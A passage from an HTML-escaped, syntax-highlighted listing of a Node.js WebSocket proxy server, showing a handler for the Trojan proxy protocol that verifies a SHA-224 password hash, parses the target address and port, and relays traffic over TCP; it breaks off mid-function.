&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    .catch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; true&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Tro-janå¤„ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; handleTrojanConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.length &amp;lt; 58&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;receivedPasswordHash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 56&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;possiblePasswords&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      UUID,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;matchedPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; null&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt; of possiblePasswords&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; crypto.createHash&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sha224&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.update&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.digest&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; receivedPasswordHash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;matchedPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; pwd&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!matchedPassword&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 56&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0d &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset + 1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd !&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; 0x01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; host, port&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset, offset + 4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 4&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x03&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;hostLen&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset, offset + hostLen&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; hostLen&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x04&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset, offset + 16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.reduce&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;s, b, i, a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i % &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ? s.concat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;a.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i - 1, i + 1&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; : s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;[])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .map&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; b.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;16&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 16&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset &amp;lt; msg.length &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0d &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset + 1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;duplex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; createWebSocketStream&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    resolveHost&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      .then&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;resolvedIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host: resolvedIP, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset &amp;lt; msg.length&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
